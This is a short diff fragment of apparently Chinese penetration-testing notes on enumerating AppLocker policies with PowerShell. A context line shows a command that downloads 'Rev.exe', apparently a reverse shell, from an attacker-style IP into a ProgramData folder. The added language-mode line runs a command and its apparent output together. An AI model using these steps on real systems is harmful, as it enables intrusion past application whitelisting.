@@ -132,5 +132,6 @@ Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft
 
 # 枚举所有Applocker策略
 ```
+$ExecutionContext.SessionState.LanguageModeConstrainedLanguage
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
